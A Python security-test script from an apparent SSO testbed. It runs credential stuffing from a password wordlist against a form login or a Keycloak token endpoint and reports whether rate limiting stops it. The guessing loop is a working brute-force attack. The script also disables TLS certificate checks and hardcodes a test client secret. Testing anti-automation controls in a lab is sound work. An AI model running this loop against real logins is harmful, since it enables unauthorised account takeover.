#!/usr/bin/env python3
"""
A2 — Credential Stuffing
OWASP ASVS v4.2 § 2.2.1 — Verify anti-automation controls exist.
MITRE ATT&CK T1110.004

Usage:
    python3 A2_credential_stuffing.py <base_url> [wordlist_path]

Examples:
    python3 A2_credential_stuffing.py http://app-c-v.local:8083
    python3 A2_credential_stuffing.py http://keycloak.local:8080

Result:
    VULNERABLE — no rate-limiting detected across the wordlist (no 429)
    PROTECTED  — 429 Too Many Requests observed
    N/A        — not applicable (e.g. WebAuthn-only profile)
"""
import sys
import time
import urllib.request
import urllib.parse
import urllib.error
import ssl
from pathlib import Path
from typing import Tuple

EMAIL         = "testuser@example.com"
WORDLIST_PATH = Path(__file__).parent.parent / "wordlists" / "top100_passwords.txt"
SSL_CTX = ssl._create_unverified_context()


def attempt_form(base_url: str, path: str, email: str, password: str) -> Tuple[int, float]:
    url  = base_url.rstrip("/") + path
    data = urllib.parse.urlencode({"email": email, "password": password}).encode()
    req  = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent",   "sso-testbed-attacker/1.0")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=10, context=SSL_CTX) as resp:
            return resp.status, time.monotonic() - t0
    except urllib.error.HTTPError as e:
        return e.code, time.monotonic() - t0
    except Exception as e:
        print(f"  [ERR] {e}")
        return 0, time.monotonic() - t0


def attempt_keycloak(kc_url: str, realm: str, client_id: str, client_secret: str,
                     username: str, password: str) -> Tuple[int, float]:
    token_url = f"{kc_url.rstrip('/')}/realms/{realm}/protocol/openid-connect/token"
    data = urllib.parse.urlencode({
        "grant_type": "password",
        "client_id": client_id,
        "client_secret": client_secret,
        "username": username,
        "password": password,
    }).encode()
    req = urllib.request.Request(token_url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "sso-testbed-attacker/1.0")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=10, context=SSL_CTX) as resp:
            return resp.status, time.monotonic() - t0
    except urllib.error.HTTPError as e:
        return e.code, time.monotonic() - t0
    except Exception as e:
        print(f"  [ERR] {e}")
        return 0, time.monotonic() - t0


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    base_url = sys.argv[1]
    wordlist = Path(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("http") else WORDLIST_PATH
    realm = sys.argv[3] if len(sys.argv) > 3 else "profile-a-vulnerable"
    client_id = sys.argv[4] if len(sys.argv) > 4 else "sso-test-app"
    client_secret = sys.argv[5] if len(sys.argv) > 5 else "testpass123"

    is_keycloak = "keycloak" in base_url
    is_profile_b = "app-b" in base_url

    if is_profile_b:
        print("[A2] Credential stuffing: N/A for WebAuthn/FIDO2 profiles")
        print("     Profile B uses passkey authentication — no passwords to stuff.")
        print()
        print("N/A — credential stuffing not applicable to WebAuthn profiles")
        return

    if is_keycloak:
        passwords = [p.strip() for p in wordlist.read_text().splitlines() if p.strip()]
        max_attempts = min(20, len(passwords))
        print(f"[A2] Credential stuffing via Keycloak ROPC: {base_url}")
        print(f"     Realm: {realm}, Client: {client_id}, User: {EMAIL}")
        print(f"     Sending {max_attempts} login attempts …\n")

        rate_limited = False
        success_at   = None

        for i, pwd in enumerate(passwords[:max_attempts], 1):
            status, elapsed = attempt_keycloak(base_url, realm, client_id, client_secret, EMAIL, pwd)
            marker = ""
            if status == 200:
                success_at = (i, pwd)
                marker = "  ← SUCCESS"
            elif status == 429:
                rate_limited = True
                marker = "  ← RATE LIMITED"
            print(f"  [{i:03d}] pwd={pwd:<20s} status={status}  {elapsed*1000:.0f}ms{marker}")
            if rate_limited or success_at:
                break

        print()
        if success_at:
            idx, pwd = success_at
            print(f"VULNERABLE — password '{pwd}' accepted at attempt {idx}")
        elif rate_limited:
            print(f"PROTECTED — rate limiting (HTTP 429) triggered after {i} attempt(s)")
        else:
            print(f"VULNERABLE — {max_attempts} attempts completed without any lockout response")
        return

    # Form-based login (Profile C Go app)
    path = "/login"
    passwords = [p.strip() for p in wordlist.read_text().splitlines() if p.strip()]
    print(f"[A2] Credential stuffing: {base_url}{path}  user={EMAIL}")
    print(f"     Wordlist: {wordlist}  ({len(passwords)} passwords)\n")

    rate_limited = False
    success_at   = None

    for i, pwd in enumerate(passwords, 1):
        status, elapsed = attempt_form(base_url, path, EMAIL, pwd)
        marker = ""
        if status == 200:
            success_at = (i, pwd)
            marker = "  ← SUCCESS"
        elif status == 429:
            rate_limited = True
            marker = "  ← RATE LIMITED"
        print(f"  [{i:03d}] pwd={pwd:<20s} status={status}  {elapsed*1000:.0f}ms{marker}")
        if rate_limited or success_at:
            break

    print()
    if success_at:
        idx, pwd = success_at
        print(f"VULNERABLE — password '{pwd}' accepted at attempt {idx}")
    elif rate_limited:
        print(f"PROTECTED — rate limiting (HTTP 429) triggered after {i} attempt(s)")
    else:
        print(f"PROTECTED — no password matched across {len(passwords)} attempts")


if __name__ == "__main__":
    main()
